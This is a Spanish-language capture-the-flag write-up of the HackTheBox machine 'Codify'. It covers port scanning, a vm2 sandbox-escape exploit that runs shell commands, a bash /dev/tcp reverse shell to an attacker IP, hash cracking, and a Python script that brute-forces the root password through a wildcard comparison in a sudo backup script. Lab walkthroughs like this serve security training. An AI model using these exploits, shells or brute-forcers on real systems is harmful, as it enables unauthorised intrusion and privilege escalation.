---
layout: post
title: Codify
parent: HackTheBox
---
# Codify
{: .no_toc }

## Contenidos
{: .no_toc .text-delta}

1. TOC
{:toc}

---
{:.lead}
![](/assets/img/HTB_Codify/C1.png)

## Fase de Reconocimiento

Esta maquina tiene dificultad **EASY**, es muy divertida de resolver y es ideal para practicar **Python**

Iniciamos comprobando nuestra conectividad con la maquina, por medio de un ping:
![](/assets/img/HTB_Codify/C2.png)
>> No olvidemos que el TTL para sistemas Linux es <=64 
Comprobada la conectividad, procederemos a hacer un scanneo con **nmap**, ya sea con el siguiente comando:

```bash
sudo nmap -sS -p- --open --min-rate 4500 -n -Pn <IP-Maquina>
```
O podemos optar por:
```bash
nmap -T5 --open -Pn <IP>
```
![](/assets/img/HTB_Codify/C3.png)
Como se puede apreciar, tenemos los siguientes puertos abiertos:

- 22; del servicio **SSH**
- 80; del servicioo **HTTP**
- 3000; de un servicio **Node.js**

![](/assets/img/HTB_Codify/C4.png)

### Virtual Hosting

Si podemos apreciar con la herramienta **whatweb** o en su parte, un navegador para ingresar al servicio **HTTP**, veremos un redirect hacia un dominio: **codify.htb**, pero no lo podremos visualizar.
![](/assets/img/HTB_Codify/C5.png)

Esto se resuelve de forma sencilla agregando el dominio al **/etc/hosts**

Podemos optimizar este paso con:

```bash
echo "<IP> codify.htb" | sudo tee -a /etc/hosts
```
![](/assets/img/HTB_Codify/C6.png)

Una vez hecho esto, podremos apreciar la pagina web:
![](/assets/img/HTB_Codify/C7.png)

Como podemos apreciar, nos ofrece un servicio **sandbox**, para codigo Javascript.
Si vamos al apartado de "about us", podremos observar que nos muestra la herramienta usada para el desarrollo de la webside.

![](/assets/img/HTB_Codify/C8.png)

Si hacemos una busqueda rapida, encontraremos el siguiente [CVE](https://github.com/advisories/GHSA-cchq-frgv-rjh5)

![](/assets/img/HTB_Codify/C9.png)

## Intrusion

Si analizamos el CVE:

```js
const {VM} = require("vm2");
const vm = new VM();

const code = `
async function fn() {
    (function stack() {
        new Error().stack;
        stack();
    })();
}
p = fn();
p.constructor = {
    [Symbol.species]: class FakePromise {
        constructor(executor) {
            executor(
                (x) => x,
                (err) => { return err.constructor.constructor('return process')().mainModule.require('child_process').execSync('touch pwned'); }
            )
        }
    }
};
p.then();
`;

console.log(vm.run(code));
```
Vemos que nos permite escapar del sandbox y nos deja ejecutar codigo dentro del sistema.

Por lo que usaremos este CVE, primero veremos si nos deja ejecutar correctamente un comando y de paso ver si nos permite mandarnos un ping a nuestra maquina atacante.

![](/assets/img/HTB_Codify/C10.png)
Y podemos ver que recibimos el ping:
![](/assets/img/HTB_Codify/C11.png)
Por lo que ahora nos quedaria montarnos una **reverse shell** para interactuar comodamente con la maquina. En mi caso usare:

```bash
bash -c "bash -i &>/dev/tcp/<IP>/Puerto 0>&1"
```
![](/assets/img/HTB_Codify/C12.png)

Como vemos, estamos como el usuario **svc**, si listamos usuarios posibles, veremos que existe un usuario: **joshua**, por lo que tendremos que encontrar la forma de escalar al usuario:
![](/assets/img/HTB_Codify/C13.png)

Vamos a buscar por carpetas interesantes a nivel de sistema, especificamente iremos a la ruta **/var/www/**, esto debido a que aqui se encuentra el servicio web.
![](/assets/img/HTB_Codify/C14.png)

Como podemos apreciar, la carpeta **contact** tiene un archivo interesante: "tickets.db"
![](/assets/img/HTB_Codify/C15.png)

Si apreciamos el contenido podremos apreciar que se trata de un script que tiene un usuario y password encriptada, por lo que nos quedara romper ese hash con **john**.

Una vez crackeada, ya tendremos la password del usuario **joshua**:
![](/assets/img/HTB_Codify/C16.png)
Una vez dentro, nos quedaria listar permisos que nos dejen escalar privilegios.
![](/assets/img/HTB_Codify/C18.png)
Como podemos ver, tenemos el siguiente script que podemos ejecutar como superusuario (root):

```bash
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'
```
### Entendiendo la vulnerabilidad

Si ponemos atencion en el script, podremos ver que hay una vulnerabilidad muy seria, justamente en la condicional:

```bash
if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi
```

Esto debido a que podemos escapar la validacion con un simple: *, creando algo parecido a una SQLi, aqui pondre un script sencillo para que lo podamos entender:
![](/assets/img/HTB_Codify/C19.png)

Si podemos apreciar, declaro una variable: **pass** que lueoo sera comparada con una variable **inputpass**, el tema es que si nosotros introducimos un caracter existente de nuestra password y agregamos un * la condicional cumple la funcion de darnos el mensaje: **correcto**, caso contrario, no lo validara.
![](/assets/img/HTB_Codify/C20.png)
Por lo que nos quedara aprovechar que la maquina tiene **Python3** para montarnos un script de fuerza bruta.
![](/assets/img/HTB_Codify/C21.png)
Como podemos apreciar, el script funciona correctamente con nuestro ejemplo, por lo que queda adecuarlo a la maquina.
## PRIVESC

Como vimos, el script de Python que nos montamos funciona muy bien, por lo que adecuado seria:

```python
import string
import subprocess

obtencion = False
password = ""
combinatoria = string.ascii_letters+string.digits
ast="*"

while not obtencion:
    for i in combinatoria:
        command = "echo %s%s%s | sudo /opt/scripts/mysql-backup.sh"%(password,i,ast)
        #print(command)
        o = subprocess.run([command], shell=True,stderr=subprocess.PIPE, stdout=subprocess.PIPE, text=True).stdout
        #print(o)
        if "Password confirmed!" in o:
            password+=i
            print("Encontrada: ", password)
            break
    else:
        obtencion = True

#print(combinatoria)
```
Y como podemos ver, hemos bruteforceado la password del usuario **ROOT**:
![](/assets/img/HTB_Codify/C22.png)
Por lo que solo queda ascender nuestros privilegios:
![](/assets/img/HTB_Codify/C23.png)

# FIN
